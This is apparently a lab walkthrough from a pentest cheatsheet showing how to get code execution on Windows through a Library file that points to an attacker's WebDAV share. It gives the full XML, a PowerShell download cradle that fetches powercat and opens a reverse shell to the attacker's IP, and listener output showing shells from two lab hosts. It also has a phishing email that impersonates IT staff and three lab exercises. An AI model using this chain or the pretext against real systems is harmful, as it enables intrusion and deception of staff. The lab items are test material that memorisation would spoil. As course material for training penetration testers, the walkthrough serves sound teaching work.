# Obtaining Code Execution via Windows Library Files

Installing pip3 and WsgiDAV
>``` shell
>kali@kali:~$ pip3 install wsgidav
>
># ========== Expected Result ==========
>Defaulting to user installation because normal site-packages is not writeable
>Collecting wsgidav
>  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
>     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 171.3/171.3 KB 1.6 MB/s eta 0:00:00
>...  
>Successfully installed json5-0.9.6 wsgidav-4.0.1  
># =====================================
>```

Starting WsgiDAV on port 80
>``` shell
>kali@kali:~$ mkdir /home/kali/webdav
>
>kali@kali:~$ touch /home/kali/webdav/test.txt
>
>kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
>
># ========== Expected Result ==========
>Running without configuration file.
>17:41:53.917 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
>17:41:53.919 - INFO    : WsgiDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-amd64-x86_64-with-glibc2.33
>17:41:53.919 - INFO    : Lock manager:      LockManager(LockStorageDict)
>17:41:53.919 - INFO    : Property manager:  None
>17:41:53.919 - INFO    : Domain controller: SimpleDomainController()
>17:41:53.919 - INFO    : Registered DAV providers by route:
>17:41:53.919 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.9/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
>17:41:53.919 - INFO    :   - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)
>17:41:53.920 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
>17:41:53.920 - WARNING : Share '/' will allow anonymous write access.
>17:41:53.920 - WARNING : Share '/:dir_browser' will allow anonymous read access.
>17:41:54.348 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.5.2+ds1 Python 3.9.10
>17:41:54.348 - INFO    : Serving on http://0.0.0.0:80 ..
># =====================================
>```

Contents of WebDAV share
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-1.png)

Windows 11 Desktop
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-2.png)

Empty Windows Library file
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-3.png)

XML and Library Description Version
>``` shell
><?xml version="1.0" encoding="UTF-8"?>
><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
>
></libraryDescription>
>```

Name and Version Tags of the Library
>``` shell
><name>@windows.storage.dll,-34582</name>
><version>6</version>
>```

Configuration for Navigation Bar Pinning and Icon
>``` shell
><isLibraryPinned>true</isLibraryPinned>
><iconReference>imageres.dll,-1003</iconReference>
>```

templateInfo and folderType tags
>``` shell
><templateInfo>
><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
></templateInfo>
>```

templateInfo and folderType tags
>``` shell
><searchConnectorDescriptionList>
><searchConnectorDescription>
><isDefaultSaveLocation>true</isDefaultSaveLocation>
><isSupported>false</isSupported>
><simpleLocation>
><url>http://192.168.119.2</url>
></simpleLocation>
></searchConnectorDescription>
></searchConnectorDescriptionList>
>```

Windows Library code for connecting to our WebDAV Share
>``` shell
><?xml version="1.0" encoding="UTF-8"?>
><libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
><name>@windows.storage.dll,-34582</name>
><version>6</version>
><isLibraryPinned>true</isLibraryPinned>
><iconReference>imageres.dll,-1003</iconReference>
><templateInfo>
><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
></templateInfo>
><searchConnectorDescriptionList>
><searchConnectorDescription>
><isDefaultSaveLocation>true</isDefaultSaveLocation>
><isSupported>false</isSupported>
><simpleLocation>
><url>http://192.168.119.2</url>
></simpleLocation>
></searchConnectorDescription>
></searchConnectorDescriptionList>
></libraryDescription>
>```

Double-Clicking the Windows Library file
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-4.png)

Modified XML code of config.Library-ms
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-5.png)

PowerShell Download Cradle and PowerCat Reverse Shell Execution
>``` shell
>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
>powercat -c 192.168.119.3 -p 4444 -e powershell"
>```

Creating a Shortcut on CLIENT137
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Obtaining-Code-Execution-via-Windows-Library-Files-6.png)

Successful reverse shell connection via our Shortcut file
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.194] 49768
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>PS C:\Windows\System32\WindowsPowerShell\v1.0>
># =====================================
>```

Example email content
>``` shell
>Hello! My name is Dwight, and I'm a new member of the IT Team. 
>
>This week I am completing some configurations we rolled out last week.
>To make this easier, I've attached a file that will automatically
>perform each step. Could you download the attachment, open the
>directory, and double-click "automatic_configuration"? Once you
>confirm the configuration in the window that appears, you're all done!
>
>If you have any questions, or run into any problems, please let me
>know!
>```

Uploading our Library file to the SMB share on the HR137 machine
>``` shell
>kali@kali:~$ cd webdav
>
>kali@kali:~/webdav$ cd webdav
>
>kali@kali:~/webdav$ rm test.txt
>
>kali@kali:~/webdav$ smbclient //192.168.50.195/share -c 'put config.Library-ms'
>
># ========== Expected Result ==========
>Enter WORKGROUP\kali's password: 
>putting file config.Library-ms as \config.Library-ms (1.8 kb/s) (average 1.8 kb/s)
># =====================================
>```

Incoming reverse shell from HR137
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.195] 56839
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
># =====================================
>
>PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
>
># ========== Expected Result ==========
>whoami
>hr137\hsmith
># =====================================
>```

Lab 1 - Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.
>``` shell
>
>```
>

Lab 2 - Answer the following question with true or false: Is the .lnk file tagged with the "Mark of the Web" when you execute it in Explorer by double-clicking the Windows library file?
>``` shell
>
>```
>

Lab 3 - Capstone Lab: Enumerate the ADMIN (VM Group 2 - VM #4) machine and find a way to leverage Windows library and shortcut files to get code execution. Obtain a reverse shell and find the flag on the desktop for the Administrator user. You can use VM #3 of VM Group 2 to prepare your attack.
>``` shell
>
>```
>
